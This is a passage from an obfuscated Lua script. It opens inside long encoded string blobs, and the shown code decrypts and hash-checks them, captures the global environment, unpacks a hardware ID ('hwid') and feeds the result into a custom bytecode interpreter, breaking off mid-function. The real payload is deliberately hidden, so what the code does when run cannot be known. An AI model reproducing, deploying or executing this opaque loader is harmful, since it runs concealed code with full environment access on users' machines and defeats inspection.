Ni-eWf3WCYbp3yhoQthMcp7aOYHBiv9TVolsQc19Sa4cfT37r2ROGlfqbGqgFS6jbrBn2gYT3JhZwuubEa_Rw6wt-0ejX2vSGe7oQadNCA09Ij3a5MCzpjkXGWpU5cRf7m9Zfm-TnSOAFH2R6KzSVQ_0IW97t-WzyX5333aoDsEvq8lkSqvKvLX52Z7o8km9pnP-AUBQ5G3VJEfv4AUCl8SXV95gyQ17NsW9LOdVulUl7bLWIivw1UaBML6Nzz_qEqR9bdOuD36RxQENnWlB_sEngQl22HD4QkK3U5GYQopWWlUldzKuOkinoge8YHTZupF4PBMUt10vA-OlZpUwIOuiQb5uqXIHg-1099Q8fBru9uD0swbmecIQ9Zd2Tt7isgUWCZpkCXaDVNB08CWTNVnkGZfPEIWhiuUtf_JA400Yai-RzuDUmo1rvqcOTlDH3XW-WOKmBVil2svzKCjtMfTIKuMjRoHioyUQlKqCvWzKKly8jYpwYJIhndby_bM1ZAFKOPTYeEkAp5Ge3KTfYHKjt45sxAz5s9t2rUboTtz_Drc8percfjyDFvszf7yyN-uIjEjwqTGo9SxXMzIsu6QyPNcoLCCn0jWgydMLvnmYdt-mW6Y1Q98EMVcephGB_W6L8oYgpXeBGiJ8IGHcSA1SaCQUT4j79iz6rnqWaN5lfbfIxw54zBmRRx_DPUY3HdHjmqnP4vvNE-3fzeC5CWAhzveuvG1BQFKUO5ubqnKEGy6BW8bt3wzob18HPC28JyHePXPi_zixi_i-GSK_fN-lhRZ72dyi9Cg0pVmvvmacXmaWA9L-AqMInFECAHrbmDf3umaVIHz88ka0BPU0JtKgCZjuKvyYYjZmkoAyT3V9G9UUS1uF86bcXx6tw_hxDn81jYIj6PgBovSQXI4NW6qUkV4T9rQsIOoUvzIGQDcXl7FdaSQ--0fLzBN_wHGSW40P6r8JdW6GyCdbw8n5s0b5YAD3Y2EXCKXJDp8zFQ98_Ytn5nOJtAxv8LXb1DMyk8AWrJLWvvETj1rm89bLIh8aa8IF0Gj9q6KS-fTlvCFANTW69PBnm0NpoTt9Df93tCeH5CKGpTy84ej5DXAaMKDa__e4hKCA0biWV4EdBETPamLFVUtC4z28etzo3iIMI3VRfUlau8HrfqOpqOFbEYpkgOxHyMITbKAaUwbmOalbuxSK6IWBTzork_jXzQS7oB1SmBWo-Tj-fC-3eu4uFDZHM8RaMiRo0rJrZHjdq_svSArnSAGJhnoF9_i3F_C0O9O_MhOFuakjqLPwaldX3IyerZDbDIDmX5wtAn3un20Ed3Qb9He9Vq11gEu7kn0UZ1xFRIKAdekqH4VCUrAMGHDzfOynFGXkQ1FL69rugymd-8m_4x3Q9pE8MUl_ycjANgtO05P3OVZueXMSX7jqhw7fHRaJhXA714IEqX5voVnH_Qdz5HI90W-h0vIQsCHoISsDKHbbFU42mttMGJS0jAoBu6gArypTF3xfFwlz2KlR9MFPOo2rIizGEx6u6DgMsFYjoCW4EF_OS8fs2lpUQHZB9vpuw8DQkslb9haALge_DQs4M9AaXXjiVnucESTCRcugx5O7de33PkVvrZwdZh-54WxAibCk6xl3H4cOT9jS9qDBMSlBCTWODmU4ZN4e64pJY-g5VLYRTjmjmEvhku2iTyisOGuJ9_lJL-94W8IG2BVTff2KFTKrRxSTDF-Y7eLoRUmC_5aaeNdrM2lp1XJl40EAfe74t9HDOApAmo2vk8XSaxVtrP4wiCsiOnU4wE449BI5syyTgODX3CzNR9iGyNp3Liufev7hIw_O_fmMaqguStOLUtIUZjSZSpIblr6zKmfQLdIpbkkAmBN3M1C2vMmEgqTdzK52BzutnglRD65LbSesSzb7uGG91GH0qWWVlFrvdysy3qKs2g3hsDQkf0e5iKPaUjDI3DVaiOL8SqPByNLRzce3p6VEyflDkB7fO1yMF8YvMho9E1MBvqLD8Y49JPmxB-Pl8WXj3kHSsbb1fJN0MnotC0ABiFOHnyzNoNpzFVkoaUM9XRWppZPaoCome9UIsvt3cx6bUqJ_lThdjpjovPgDTDjr8zmU2r8SEMlt9Ng4t-KqZ16puL12ujYLcylubeJtUNI6AoY8Gf-UKL4au99Y41hK3jF0utrFcIu8H4jT4qqW68VkxmzFcIXnLlZoUpJc40Xsye4gX1glheW0hhm1XJYtNOyX2BQlT3E-fTb9uKkjojy1oZEiSQRq8GMLADHwFTSZl_bLm8UsQnLwBFeZL30LN1aZY-CB2RU7ZYi-UiHZmQ6f-B2n-HfW4OjJUv4tX8k4IJwt3Hcxm_Bd2JN1FVwMvxKmIxVQPMmg2AUCoP6oimJ2dbsbQD3-432KHwiH58gAwI3Se4_Ikn4CisxbqW-19h2AD4bCgTfEiVMEXSIFwZHfuJs8h1rdxsImg7SDoIb77CnGCoP0ooWvgko5_T9vfjukNh6lBigqUnvDYzZcObQNxFB6g7O5th-3iPz2Z-IiJYWAOFIIqz7koapFM7NRC2uzCOneUrqTsNJw6mv1U3upUMYglpWV67tlTEKadggV2Uf5Fx1R1ZO4o7AwKq6_4R1BDS2Cz4cwJn0C0yilx9zdoHYR-ZfJpD5x49A3idTsXWsUXjlI6Ot0DpMsNLOyrDVmqIMqIORn-HjDuFh3Od4RBZoPouu5Nh-rI-ZFtMs2P7GoypeubwbQlPG6kie0ssr1R049LMclwdymc-ZCRtoiDJNbFQ5sY3sbyuV_il8wt_FRHm0xa4KpVdrTCu_Mep2lplFte5jhzD3MuvsdldMISRbYr-LrUC7OvZLocxfBTp_tyRuLzPvtEs1I1eD0ztKxb8eYJcDNnIbUSoecAyAlKkHQL3Pu-tn3zQK02DHUtsoEK0QJ2K2mmQjyUH_Cc6oUk_NRhzGTK0FQ6uflGt4W4xQQN8sARXgUoC7Xy2dw1nI7qEr6Eq6byoa9PkcHO1_pFg6jN4FqQ47ej9OyNFxlTwrzUShkwuovR7iLiMHjoWGJj7QKCtJW_BUmj-Nkyh8xVxDFyrPvM_oY3646k9HZaeZaYJ-EaRjVtFC3NyNwf9thzB4zp64Bp_6rDqOGapOvBiZS1TCuue94e00Aof_w6gvpOxqazMOKJXmi0vl8zl0DyWbdTE4VOWq4f9c_fFQH63Dfu2HbWwse5Z54XEXVb_nVFckWb2bcYHglFVyMne1AVr3OgE_F6GLq8ymbmeMxjjuLQHJ1UMwbqWjjCIBfAa3xGhuU5YDnmOqe7ifKtaXqmllxusbBFoQd13oKgK1H3O6aP6owqiQRenDy37VYS6VA7bIh8lOPX-0N8ixHTqK9Q9UW05yPnWyhvVf7RRXzlifafjDa8PO38j8cuzF5MhGCSeeDZlLdgCXU2n6m2zaN0D67fGFXRcKTwKrJr_WpXx8Zo1G749iGaJ8C6PEfmPdyBmXjsK0qIpmeQKrwvv3t_ht2qNsegPaepdZmxFvrKi23UBMF7xQpca6zQwMZ6F3w2U098NHdqGIwB6V5bBY5MoxqnSM9_4vJ45B6sO7xkPmvBpj6VP1vm72FJTtfRX4XR-ZdHpsuOFzDaV7W0aR_7rfwIvSNhXwdULdGDAXA8KodR27Osx_YOMWZCECWoVRwhsMY4cGy1nXUXWmRUAjDUFn1F7_CNax69vK4pQ48b7zL8mXGpw7LD51VhKt6QHDB2emg_wKigYAlmFH_LYqA-Jci4fm3JZkzM2co9dc8dLbwQfzOamdZ2RRnetGaFO2XiquOFtg4aAEmEUqvKTZ8kIz-0wHn8Z3KaUqq6TpWBABmO_auKGQErP4pp2_bCqyDHlqqdY8H64O2ZGRvZaq5rq6JNqusnVlMD0-xCuC9Ai3ZGrjX_bENvGC23abgGsQsyZWsngPvneCt6bGwiOEuZKqHcShZmSZZB0HXkWhFZ3_TKOf-AWjcQ7uhOx4OXly7ZP-Ln4hQwvuQlTwWEQPJFjfL4K9_CwmnnkiPj8qKqd_J_VpUo0T8ovs1yGtbH5Ed8teQgVSQrIbX1HISl_RhOz3W9ex67EVbR-tlZLuZinzSPdsV2AedD27f9WkfKb4dLm29HRZvUETsvNT9aAhHf8BWmVtlJV_keURuu4LJmBWT2aX9JCObKw3a7DMSGmTQ19fD2iqpaQ1Rv91fDSLNPgAsSr7icmJYF_h7mT4-9UBGi20p_dgWmBzj-6u-Gn3HjRge5565vrX9VPYyEayXwkzx8dmDlIcToxbRj6q1gY58E8iCZduL0sjNpWP90_ymk2UpLXTELG5fpm6ejlS7WrlNdpK76KEqffgPMLxEC9Mg0wA5wS3K-VjjIotc_DxGceRyLz3aJ0ij1oe6eoo_QRFw9mIRdBI2rcGURTV49dwW_aq9tr4od0cTxjhtJ4A8AqI6532mLjGS45JYOui6aQpJYzvRutCeD_E89SpHMZG5Kc7nS1fdOF_asSD-9-TArCxptFLx5P_Y4Ra-_G7D6OL2kZS7eYwSaw1wtpJD1ujyR0CPfNsTJ2PX580btLn72wnbfuaEpMoTBV5WQb3sv-g90SltfAUMgPAC_4xXFaG3m95MWVCOI-TdouOV6nDenk6OtWG9tRHvu7HgYB4uK9gbtXWuO80Qc2y-bzm1IctdaMd077p-NdhM79kPUk0pKfF4ruxqYUb3YKZVqDvCo2C5DJa0G6ZJqkArCMHunP0V1zfa3-uVrNTcPkWbNNch9nsZcnpk_l1Wh8Ij6SUdHfv_yTdLgtQNIyZHCNjWmt9U0uNcHYbEnYQbzQXc_NaopV5okvQrFEr2anewL5iBiKa2RddcEp0ek1fiTbOTU6BEErVL8BSBTlXFUPEpw_XhQPDMANi_xlridB3NRWYU5QMYZF_hcPVrtYUUaDPPxMGiVq24DGdF00c-N4ao7dWOyoRwuKRbYv5fubY7AdwDG3tgfYGqLxDqBjo9qgC4sfCWJLTfBx69obwSZjv0BF_g2ADc4S-TX_yA0Jci9-zaPHhybVCkzecHXaFby5fJIbk1eHt4UmkgYlosCQn8SE5HdxVq1yHnF6vJ_x-RyXCsvLZI_OCgY4Yrv_Sl7QTylTPBrErui9x6SBuTopEo7DMwrBnfCvxk0Qq2nP6CXjbbnv2DaXvkcncc2qHtszoYoNAE8aQtdve0eilrIjs1ypO6DGNxpHP7LwK3ngwTEPGKeWWN6azwzTAt40JKSopV1XwEZsjXE2wKdtQaQ0uqZ1IL0Kioa7pYv1v25_1zcLJGDhZ4F-W8UIOYCwGvrnkQ4vO-FTrWY_Bjq4nj4jPudp0hdXAMKMALOSteBY7-vl8QVa_vOtwstF6S5z4qHcdUE9tbIGrA7-22KDQAXXWL-EynkTqMTBN9qKWE-Wc524O5IfVtvaQTlBf5FXZ84WPTP8zWHPEZx9bZRTOSlblU30HLYinhwCTKsw0EBw1yYSQkS3phFAxOzrazyP3T2WjiI1FanRiRKmRFl0K6olR7-nYHx-G2vmRw33oGGE9AT2GIjE5f9galUcCwNE8twFBkIPS0dMX4QyDOg7lJufhvbnl6-fdVTRS1PGLELbs5qOwYw7_RFBtee0Nie6rwfbsDADNMEcnHdXNT7AX7Dk3tfPKlxpT8Dr5Yxa3iDZhjkVQCkbeb-hSj3Lwz6bfEdaCuZPkiwrZgY7s2u5EHXswga5N2vJKTcsJsxNcaX34Y35HbCQ3E1MVFn3TLXU0EtkJA5BfJ5XtLIt2MMPV8lpQE2EzY692W7lgDSaHkK7g3HvT8pHk2Q6MGO8d4_8mZQzjKtm56SvV-_1G6Um7asf0DsTYC48uycJZ8kApnHWi35O4CmzdkNrT-xJIBng4DfahcXAqK3ZcDv3H4nX8I4w40q-hQaFTjN-hDD7-mGHJUYJTeWh7QSK_0COO6hpDbNV_4e0Vfr1uVIjL7RH9ONFI95dx17MwbIzr8Y3rXB6czezQfm5UIOsyYbRa5WzT5Yq2rgPWvsV0y4-C7rHondWn-kJOmwLYEwU7fLDJ7jhhwfJurphRMGBqG0j2RySemSvssgLUS25bVnbtNULxaxPlgRSzJhd4_I1gVpeZ0u8yV7Mr_BeW4_1GzGzdViMSPP1c1Ja2RfVU6GTBzdw_ODjNo1VnlYt0UA1tOdNolBNWr2YKdpxuh1rDvfmfLLs6aavJ8HbV6GY-40_hWySmc9EV7AADYOjGA0lRw-OHuxfRjzf9-Y79cV9zbsr3PY4XYcFMUgEyJaAYcSJWnSjhKMJhl2BCqQG0c4_K78efSMdYGQGLUv3MLUJRc-i3DiQ0SiP5",
"Ij9BvkhcGBLYGT862tB1Fb49fAwp3tlI_vn_54ofjkSDedztD-XIrGde68PIBqo2KCvXCJFzCmqa53SbzpBMcVvhmnkl1PU_SfdasHNy6Bsks519umjhuTBi7xcoiEMPWrZtgjc4hyFqtwitFklwFhtL-Bovg5xRLMt5HoGHRoi4YzYII2Sdfw02aheYrUJhehezV26s9l593jlXuLKpgm3_lrNRrFA-XVGyhptfTb3gfiMEypP6Lxq8PRLybctHw-LQmLYTmguob6FE16wAwlnjb3Eqk8b6tuv3O6VuLzP7ItM7FFeEYice6EnumDYBg8OGHLRYLeUgoSjrTjFg4xnCoZnaltCGh2etd6L6vYQF14OLabodi-pcYIhcwiAgrXcheeOqZD1hGbp72lGN--DO0K-EUC67Q1jngUxv2vAbf345AIrRyTYsWN7vF8jDD7r1nks_F4OJESFB-mqH50NHmTa6yrkC9iaSElfUtAmvjoFXkHJTU_4JauQh0UbIBnvjKJbI5oGNnfKMNUTnU_4PW5l5McmEz56LFQPmotT8oXJzElTxUwtFNZESdSOozFkMs5Bwf6xxDJipmsaSUYJvNqriUGFpGi6fZHaMrOBWH-_8Jr8UDF1pxUeOZwHxF5fzG7jMAm2Ma85jd7vx63ovNIqeWWsWMq4gag-kGWEvJzWb8vhB1QYSDxVQf8uQg3DxXGD_oVH_O0gFdBhXWi9V8sphxkqB4bIpAqVZgW4b2R_UbIsbJt8pSpGUbUYxmAnhX7vbXAg3075oy-lF0Z4falgB2kZUtSUwgCrKE1Ay_ciknMYk-iEsXuUD7XARXaGADZ8vDf4wx1HczuhHro7cyXzQvf7WJBSWKTRvo6WBLnm0N5iWyjLuMWQIlvLGZXBeM5jyj7sIC9O5Qr-gBazUHOVV6RFPrW7c2QdvvHfxMMyanWWobVQtTsK5MZZitGjg9PNzlTIv_nRknwf7LKI6SC-BpmiRQg9U7y8WWh8_wxtqdlMymKeJEy8zJFJbHGtNhCZGngjTYeLf74vBAbKDqFG2mEXAYU-eiBfK-pkRfiHjHCYW3OPrni49vG_AqIi6Arcpvr7SwAAhgi3HQMuc-3EnVM_9Ds7RxrcYcLyzxzG0ZxMutGLJnLXE4eIuHkt-XkLEsDVz64H9-DWu1dfMA18E_UUz9bqNdEtQu74qBWxrtKyiFAnCxpTec3onf3XNwLX-02EqD54thQkQZXwuanui0TyxSzmcYbnwzGbRuHrDmQ4diBbCJl2jM3CH_F5DNkyQqfKssV6pH-KRCElwDvH3WJDGbRU2zutLWdzS-MebzIG7aX1rwX_gRSLGiCPTohSvs6rDXkSExohLZZr6pPWJjeD9F2yeZnJINumSTvFZ5XbMV2G1JteAZPyY-FJzkN3ziFEArF4tkB3F_gmpxpaHUceo0zfswZ-_WMfshf5D4oBBQP1mXFG_po2h6x8YOl926cbQWPTphzdKR469hPj-OaKlvAjpLHSpTF4yVtauWe9PPPyZT9pc7wFVHc14yi8KsEGJAqZGigknwwF5GmcnDIY3zOZK5YyEnymQppbfyMCOp60N2ziBqGoAEZQSnHhzS7WtlYrBWhnlNyB5JsZxs9nKV5WDoM4pXpHc21YODOXu5FQ8L6u-ZaHMh47X2dxIhANFGgQAY5LwNY47oDUqUmAAGnTWbPTdxkVqCrVWuMJBIOky8AQnq7vzZtXpVvlYTTxGmsvT2UxdU0g8WGS9yokolSU5MyO-xZDO6jGzv0x2X1q11Q8XXe01es7zfScjaWmxe5Nnk64DuG_xP2IS_5EjA6nCWw5LtK3TgcUzZuV1TIRQgw66bfOGh9aJrVGbHjcXSySr4vcJiPlViOym1DxwpO9Xr-JwULY4Bi5x1R4YB1JwgCO5Np5TscBebrLZdvWh8je2LrrL3HEl2zeC1Y9AY8LueFgue7pkynQhW3UWsk-p17rvmzK0hNpuUZ0fFQBHDxJNyFZclWiJUZG1RmAPL-5ugxKsdLJLNY1fNcWa9B0-x3G7ZCYwCM19F1rnmTsHsDa6pRSUqeIfemQv62pj1Juk3lagwVd7y4Lke2Cs8XxDVHELaIeQPdIVLK8TG6UkUZMfyRNdYnw9zetalDtHOV-s0O0ZDoDRB8u_-FJEfGKW6HYG0I3SNB7lSd3JVFpBjYZysZqqlfghroQO3q5qSmZWR9zXhkRUSAq7vhAIouxZCBHEENrDZVWcdBAR7SIYmPzNI9vrQvAfRjdZTl4Z-WEjuK0uUHuxattMTKF0oPg6mbezZ3l6EbUBUcrVlFyAMvSeuZgi-7MSzJSSbGU1yqXf9dLzvWkW8w_-eaej14NDlWxYMul3BUfpAdcZl80QubPWmJ5pn2bQcNkJCOg5G6sj_FEuVlcAGRJjIin9n7_e-cRygFd-dfrSRYM5Bnnv5bYwIjzRAwcivsnxAI_ftbcPj9-yW5Sxq7cuF_-fB6h5ikY4F419cfn7FnTJjYW9HTk6ImtIKWk1R_p2dSpvbKqO_8kotZPNiPEUgV-zQNkm172qkIC3fmS9_mnROgVXaSn6w6TrGiW0gQpMaqYHqul021bAmnUZBvj2Jvq_CkqKlANpH5Ed20perXhi6MqbcWYNyx13JfU9lg5zDM1a7-NULdD4vEBsr7xYrvR_VEtqdkCsXhugTLRqLpXGlvm7swCLRsfDu_Hct016iaYZXGQO4Lq-YiQLkj0kO64V_JmJi_5uA_EXxq_4klBZrNZ62j87jSHKMsvrLISaT4XrCuA3gVjgI7f55AoVTKH8Z_AQLi2IAMWohgo7RTpYoddgp746PEgD6k8cNBXs37eKpoUuGbyd-l6tJgtoBeSSgTijlvFEdHDsM0Ljfrua9ug7ukq_MUGfx1niuIPeVaS0tTCA6FTOdvkhmIzzI1FOQhn51sGqop9zhr3cdTQbJFii2CeduzQpDT-hAEwTA9HFUhLayvXwnotbej0FVgnIigUUy0AiKgLyh78hQmTu7vSmk9kNPwSpLkTSAWzZnVY0KIHgsVG980FgftEUep0lxTxzlYvIE7U-zlkdKZLSn4cCXlcNXbLIRw8C0l5pC-_1UGckIIreEzG3hjgwal07OcznGG7ppvQYUrOmYKlxjFyxKaKElZsboHAKdBKZrwEQyNssQVnAmZWiBkfAMn7FXVBtvi0-2OegpLMtS0LlWyIAIMYtYXkDzcYmueOD4LZDlqj1pqEXQ5ErdOBXSc-r43WaSAoQaS_r3AM9g2Rm0p47rw1MC_dJMeb4iEz3ZlvXgTiXvNKFXit1860DCfv2ut4ObBm_jh-CTZLuNkv2T2KpD0pDV0jEODOj-6EXfwVST8VwCcluOU6cql-itTBxxv0LM584a_tmyJfjiz_noXWMNDbUWsuc1oMdxqSLWx2clFr1lxDRIGPSmMx3LHe2GS6WfX4IHABgoPH4Ru4tyrocnIDVSB8ZdI7xvAexswFyourNJCOrm4HahdrJD7Htnh37qlE8Hwy3yRJ0ufw23p6-xGK0YfnRqGToAPXzRisdFyxerU0TxXBa2fwCcGoQz_Rz6gwi4T_hlG8639OahHIHYN5Ss1-xIJuaVyQk9MAnQK-ArhA4qcNESVvrPN9Qvilh4-oZ06i3Kq3jFEPmrFCiX-pFR40A1eC3BMtaTRyJJG25maGsZQOKD8OsMsMpR86uvycOn9XXXC_OXn2cwM8UiFUJSiyFxQfQUW5rzCTM84rVne7cQwRPGJKFot4m_61uFwhPR8MNzoFVfq31u5V07lhmv3x1kQfHIfKphUcUXmxm7wzY5HxegoZGo00OcvBt5fwXTOnXONUxnUmHXX-ri5q68JFtDyeu6ea_Nu5OcIfiujnV7fVhaN-01MKyaQwGShYXXnSjNTicts9QM6w2jPh9uMhB-tw1wi7muKraiu5bffirNmNK7jihn85g6bmcH-CcETcqOZooqPe2dEwjHn3mjD61PQHmut9OjKsATa7bgSpvBEjc3iDjLdRz39sPitMHM7H9Y3CwWnSJ4OHk-oWjvilRZUGID41djlg5vODKK-RBQ6BG3Uw4FBLvNIQvKZSmwXGW-W5M-KCGb98tGy4LeYoe5ReTvZoFoyD8R_BcZzw_X1vCl-OlP21vrA4XC_4J0thUVt9iX7JHoFe9fQvlwt1_TyYxBQlyPrH7xgR4C3BKTaU7wYBXiom-WAdgm8yYnoqer4nN6cOMylBQLaFR-QlxBBKgVVY4XEt-UkqRMgAMCx2T60xyPwO0PRRTjGfMWlAsBt628qJIEEiDYkNp7saJKXSyiGROA3-gZ24zIXDIA0ViyG2onOFbgKTLIX-LUB4xyfI34J0sCGMDqrMHO9kFJEWGpnz9D4KPnbxxp5JXnwMdG29J2RNTWLZexKMkmbiORYKR7ZzIEa7rYW01DEVIVMV_AmDpNkqwzdcveKpygwfE8N_7MUXm8iicorweCG-ayBI416URpF2QkoexVU_msBd8r1f8qanFDP2DYVGEuRvjTlV0GdNQPUuUYWJ513iJnILhzGNOjYhUcARY5RgF4VdlTWl_JI3DEjUFa39WUWfSqYBVogZLTayIPZx4jefFx254WD9bQ95uwRoK5QEDwXn7TTOmYcojVz99oWIVUpzz1oLSoG-lbGUfaMfh_R1yyZ3d5nqqaigmBgjit65X67_2hVOZz_JMIv-3aMA80UmceJF7Kl5a6bixLH8nbcN1JXFGWOiL7z8k3o2__SqIXf3pLXeFiYlBbQkuC2-TU5E9xUt0RUWM7XbVTvc3sK690h91B6fJ3fOq9YyYSr36DOQ_yrPbbX0flrK4fH7x0zl3YuhQswkY0fuQWLny7neIMHPbccBkjbqFQa3PzrG8aPxCnKbvD6IkVDVyw_KBxIdr5gxDGngwjR1gxjWKGJpmb39RerZNpQs2CAaIEnX8UZEOgR4CNnaYvfDekmiko690inKakMeyJA_oSwvnWMshAsxbcpJviI22Y88E54e6NOCLVQ-E_F3Q6qS7Kn3hMHIvx8GoqpeBGiH9DOit7k5EH0DjEOMLe6ylwE_XENEnpnt-ulgrolNkKANGlSqf4zTAfyAk_E0xBejd92ou2E9UOSkbyq5aJfxKeLvmEwnWPufLrSsIp_pG7UU0j8WZ74_Rte7sMcYCEV8t_AyAbqVnW6G_Y7yz00_aStyUb282ziYXHMKVRiuMZSxSFm9QDlnZ33G6yEJESJp7f87NCsycxMcqZw_6i3u5Vv4zcV6guXuUZao3jtloTt89JjGhG5T4qd4qtaiTTPHVyzZbDX0pfMYF37jgsS4ktZQnXdqvQEkQUyp0A9AsUY3Ksb3aMYTi_CE3RxL2L93r4NHHwaATmBrr9e7HPbDPJXcs469omIsUFSuTOjCVsHYnTDXsISGp8-o3D1m6oJIlcJReZq-7Sul8oJNscitdh4xCwKHb5KfxUZrQGMYACxUvxUPl94gmHkARukQ6A_iMmOEpGP8Xl32JzrSoPO8BKo1Kz4nEHBCo0-Bwd5NXySrzQ1iKkteHVnBlxM6hV-iqHboAg6IZQ0e59RDNcyOV7h1G5psqbJuW3ucNl57Tb19HnPHGhcZtlFRHSEry7X0t1oLRXpJdwzIwBu1NaEpR-Lp5ypCE_UKEmFb1GejCGvCNWiYX5QZIV6-kRapcq-ZcmkjXJAcmK6f3YjEZVrxfYyyZTrVj_Q5D9QqTYJ-7vCkttQJwcfsJ3KdCCcmrjCyeY2zHHaYifDKcO1Ca-baLLCzPWFdhMdYCFTFuyB6el54f6qO9sldKIdapvEyHFVIdvXqw6S9WmTeFSoAC9T28UB6bC-qOGdjNd0C8-rAkH1eTZ4jd35E2stPWswz-cKyrSsgi5zFPookRBSRDXfGq9GS7gPf5YLRxpY3b2ozj7mzTGHpkhN9duOngRWMW9zelrz2kjbdhH2lS-1oE2wq-mOzXk95DrgKsM6rwEnLsxLFHIQZ_BfjSljLoHzpd65uYfbr42v6IAEhSTXkZBN98xDHX4xMo4Z1mHFlem00yPw4eeGmQZQY---0n-orbRNEHIQaVYca7v49U_UcpHlXmA4BSR81OJERCBY0Z6WAoFfMeOXE8QFKAvJfMm65kUe7t8-VqDSNCq3LzDBrzeLkcCV-b387QyrLWahbnVRrvFgdP7Kp3CQlFDQXRXAPLBPzqs4tRf_W3KBpSb27ExNV1ATtZOpJiGsA5zjxJjEgB4bBNAHXqW6cHAKZZO5sRqI8ljnBgH1Y0UD922gWzyBjS5OA-kLn9eVgu2K9HhqH288ynzEGNVkRaztyU7Csvd-4gi4G7nhYzu1kDkgUCnrswtC2LODjWemERGNtLx8HO1sLRV3CiBjveW7YoFAmLUZWGjnwMtssioa1hrjS0qGfaVIFyHsYhwf75RYQOTaD2i6AYX6MO32pIfMO0k6Mkf9V8JXcPXxl-V5i2yNzWSq7BgcchntVJ5Cb713YoacSOySiJyhh6z9CNG70cRhfVf-vRneAD-ACXQ8AKWGmiil7RWN0LYeBdCoH3S88FzqsJ_fLwo-stX0kUk_byEoEg1BshDldcruYdJpyiv-gLstmbtM8CFz9ybgsz11yNxmKwAcS8miG7JX8d-eMN-60CPudgAHGItqSyZ1ZRyelJ_oias112vaZk4w6U71r9ddHmTvqPuuEp9H9pPhZHUToISqhDRpsE2ygcPYZkOprY1yPMl4sE1iNo1a7UXB-EmWVkFbKP2Rpi5WaSAIY16RBu-gXJV0I22VNgzq5ekg7Owb8ec2ajTmTefS8bZufsPh_qdsTPXnFO8aDTrRDxg1hRkPl2Iut4aCqNJkgPmnjK3oFXG0mlkM6_Nrjr5b_A1Lwu4iDnWNomIKx-fA7K9Sx-GLWNHBq7vLwnua41BX6mI6p1VyU0LjoJwq_58FcLemUHT7K8qpqdMBWn7Fq-OxABjQzHRJVx9ZTvZHOrUS8sLY4Dg",
}
local _f0ff={1,3,2}
local _12c8={} for i=1,#_f0ff do _12c8[i]=_56a8[_f0ff[i]] end
local _2ad,_4b0b=_193f(_924d(table.concat(_12c8)))
if _4b0b~=2999540611 then error(string.char(56,53,51,49),0) end
local _a2d
pcall(function() if type(getfenv)=="function" then _a2d=getfenv(1) end end)
if type(_a2d)~="table" then pcall(function() _a2d=_ENV end) end
if type(_a2d)~="table" then _a2d=_G end
local _96c,_4,_94e=_st(_2ad)
local _fa2=_hs(_96c,_a2d)
return _fa2
end)()
end)()
if type(_fae3c7)~="table" then return end
local hwid,_78e0d0,_c79105,_6c7179,_b84da6,_d64de6,_22ff37,nap =
  _fae3c7[1],_fae3c7[2],_fae3c7[3],_fae3c7[4],_fae3c7[5],_fae3c7[6],_fae3c7[7],_fae3c7[8]
_fae3c7=nil
_1c1d94=(function()
return (function()
local _890={}
for _kkd=0,255 do _890[_kkd]=string.char(_kkd) end
local _777d={}
do
  local _ct0="iAnCGV49PrF0y_MXdgLToUzOEaJZtwcWDHqs1xNK-QBfkl6j2RIS7mYeub53vhp8"
  for _kkd=1,#_ct0 do _777d[string.byte(_ct0,_kkd)]=_kkd-1 end
end
local function _f64d(s)
  local _2ns,_3lg,_7kg,_djd={},0,0,0
  for _kkd=1,#s do
    local _c7s=_777d[string.byte(s,_kkd)]
    if _c7s then
      _7kg=_7kg*64+_c7s
      _djd=_djd+6
      if _djd>=8 then
        _djd=_djd-8
        local _u1s=2^_djd
        _3lg=_3lg+1
        _2ns[_3lg]=_890[math.floor(_7kg/_u1s)%256]
        _7kg=_7kg%_u1s
      end
    end
  end
  return table.concat(_2ns)
end
local _ed={}
do
  local _i0h="\183}\250\244\131\020Z/\019c\189H\169\178\222\009:&Q\254E\152\210\249\024\207G#\219A-%O\255e\159\003\213\209\186\161,I\136\015\155\141\194\151R\018L\165\200\143'j\171\145\r0S\173\216\138\134N\238\179\139>4\193BCV\027sv\217\1578\237\202|h\225ql\012+\004\140\241\177\001\253\204f_\211\\\011\245\147{\030Y\158\196\236\195\203\252\129\167\175\132\208i)t\133\130\176\190^\233y\144\021$\nPJ @\182\007\174\006\185W\243\229\154\235\215\172\218\197\2399\026\14265p\248r\008\184D\228\005\146\205\016\242F\148\212\181z\000\150<w\023!x\164\149\160=(u2\224k\022\031\192\1621o\127T\223X]\240\199d\230\166\234\221[\156\029U\153a.\128\028\180\187Km\025\246n3\251\247\201\2327\002;\206\191\135?\170\"\014g\168\188\198\231\227b\214\163\226*M\220\017`~\137"
  for _kkd=1,256 do _ed[string.byte(_i0h,_kkd)]=_kkd-1 end
end
local function _0(S)
  local _5u5,_ups=2740120451,77
  local _2ns,_3lg,_umk={},0,0
  local P=29375 A=-1245717991 L=7341896
  local K={90,129,77,232,177,27,182,16,171,54,154,185,183,140,208,12,70,96,254,5,25,193,55,215,17,107,168,199,69,12,183,206}
  for _kkd=1,#S do
    _5u5=(P*_5u5+A)%4294967296
    local _6qa=string.byte(S,_kkd)
    local _74l=(_5u5%256+K[((_kkd-1)%32)+1]+((_kkd*113+L)%256)+_ups)%256
    _ups=_6qa
    local _wj0=(_ed[_6qa]-_74l)%256
    _umk=(_umk*33+_wj0)%4294967296
    _3lg=_3lg+1
    _2ns[_3lg]=_890[_wj0]
  end
  return table.concat(_2ns),_umk
end
local function _jr(_dz, _oa)
local _fu = table.unpack or unpack
local function _qv(...) return { n = select('#', ...), ... } end
local _bx
_bx = function(_lt, _wf, _xz)
local f1qaf9, _jy, f30zch = _lt.f1qaf9, _lt.k, _lt.f30zch
local _tc = {}
local _cj = _lt.fjbz1
for _as = 1, _cj do _tc[_as] = _wf[_as] end
local _ty, _ea = {}, 0
if _lt.f6fl5a then
local _li = _wf.n or #_wf
for _as = _cj + 1, _li do _ea = _ea + 1; _ty[_ea] = _wf[_as] end
end
local _pb = _lt.f1rcji + 8
local _ad = 1
while true do
local _le = f1qaf9[_ad]
local _xk = f1qaf9[_ad + 1]
if _le == 39 then
_tc[_xk] = _tc[f1qaf9[_ad + 2]]
_ad = _ad + 4
elseif _le == 14 then
_tc[_xk] = _jy[f1qaf9[_ad + 2]]
_ad = _ad + 4
elseif _le == 43 then
_tc[_xk] = _oa[_jy[f1qaf9[_ad + 2]]]
_ad = _ad + 4
elseif _le == 26 then
local _im = f1qaf9[_ad + 2]
local _hw = _tc[_im]
if _im >= 256 then _hw = _jy[_im - 256] end
local _tn = f1qaf9[_ad + 3]
if _tn >= 256 then _tn = _jy[_tn - 256] else _tn = _tc[_tn] end
_tc[_xk] = _hw[_tn]
_ad = _ad + 4
elseif _le == 30 then
local _im, _tn = f1qaf9[_ad + 2], f1qaf9[_ad + 3]
